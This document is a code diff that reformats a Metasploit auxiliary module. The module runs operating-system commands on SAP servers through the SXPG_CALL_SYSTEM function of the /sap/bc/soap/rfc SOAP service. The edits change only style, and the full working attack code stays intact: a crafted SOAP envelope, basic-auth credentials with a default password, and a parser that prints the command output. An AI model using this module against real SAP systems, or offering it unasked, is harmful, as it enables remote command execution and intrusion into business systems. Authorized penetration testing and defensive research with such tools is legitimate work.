@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -17,7 +18,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -25,11 +25,11 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution',
-      'Description' => %q{
+      'Description' => %q(
           This module makes use of the SXPG_CALL_SYSTEM Remote Function Call, through the
         use of the /sap/bc/soap/rfc SOAP service to execute OS commands as configured in
         the SM69 transaction.
-        },
+        ),
       'References' =>
         [
           [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
@@ -49,8 +49,9 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('HttpPassword', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'SM69 command to be executed', 'PING']),
         OptString.new('PARAM', [false, 'Additional parameters for the SM69 command', nil]),
-        OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
-      ], self.class)
+        OptEnum.new('OS', [true, 'SM69 Target OS', 'ANYOS', ['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
+      ], self.class
+    )
   end
 
   def run_host(ip)
@@ -59,42 +60,40 @@ class MetasploitModule < Msf::Auxiliary
     data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
     data << '<env:Body>'
     data << '<n1:SXPG_CALL_SYSTEM xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
-    if datastore['PARAM']
-      data << '<ADDITIONAL_PARAMETERS>' + datastore['PARAM'] + ' </ADDITIONAL_PARAMETERS>'
-    else
-      data << '<ADDITIONAL_PARAMETERS> </ADDITIONAL_PARAMETERS>'
-    end
+    data << if datastore['PARAM']
+              '<ADDITIONAL_PARAMETERS>' + datastore['PARAM'] + ' </ADDITIONAL_PARAMETERS>'
+            else
+              '<ADDITIONAL_PARAMETERS> </ADDITIONAL_PARAMETERS>'
+            end
     data << '<COMMANDNAME>' + datastore['CMD'] + '</COMMANDNAME>'
-    data << '<OPERATINGSYSTEM>' + os +'</OPERATINGSYSTEM>'
+    data << '<OPERATINGSYSTEM>' + os + '</OPERATINGSYSTEM>'
     data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>'
     data << '</n1:SXPG_CALL_SYSTEM>'
     data << '</env:Body>'
     data << '</env:Envelope>'
     print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_COMMAND_EXECUTE request")
     begin
-      res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc',
-        'method' => 'POST',
-        'data' => data,
-        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
-        'ctype' => 'text/xml; charset=UTF-8',
-        'encode_params' => false,
-        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-        'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-        },
-        'vars_get' => {
-          'sap-client'    => datastore['CLIENT'],
-          'sap-language'  => 'EN'
-        }
-      })
-      if res and res.code != 500 and res.code != 200
+      res = send_request_cgi('uri' => '/sap/bc/soap/rfc',
+                             'method' => 'POST',
+                             'data' => data,
+                             'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+                             'ctype' => 'text/xml; charset=UTF-8',
+                             'encode_params' => false,
+                             'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+                             'headers' => {
+                               'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
+                             },
+                             'vars_get' => {
+                               'sap-client' => datastore['CLIENT'],
+                               'sap-language' => 'EN'
+                             })
+      if res && (res.code != 500) && (res.code != 200)
         # to do - implement error handlers for each status code, 404, 301, etc.
         print_error("[SAP] #{ip}:#{rport} - something went wrong!")
         return
-      elsif res and res.body =~ /faultstring/
+      elsif res && res.body =~ /faultstring/
         error = res.body.scan(%r{<faultstring>(.*?)</faultstring>})
-        0.upto(error.length-1) do |i|
+        0.upto(error.length - 1) do |i|
           print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
         end
         return
@@ -102,14 +101,14 @@ class MetasploitModule < Msf::Auxiliary
         print_status("[SAP] #{ip}:#{rport} - got response")
         saptbl = Msf::Ui::Console::Table.new(
           Msf::Ui::Console::Table::Style::Default,
-            'Header' => "[SAP] SXPG_CALL_SYSTEM ",
-            'Prefix' => "\n",
-            'Postfix' => "\n",
-            'Indent' => 1,
-            'Columns' =>["Output",]
-            )
+          'Header' => "[SAP] SXPG_CALL_SYSTEM ",
+          'Prefix' => "\n",
+          'Postfix' => "\n",
+          'Indent' => 1,
+          'Columns' => ["Output"]
+        )
         output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
-        for i in 0..output.length-1
+        for i in 0..output.length - 1
           saptbl << [output[i]]
         end
         print(saptbl.to_s)
@@ -121,6 +120,5 @@ class MetasploitModule < Msf::Auxiliary
       print_error("[SAP] #{ip}:#{rport} - Unable to connect")
       return
     end
-
   end
 end
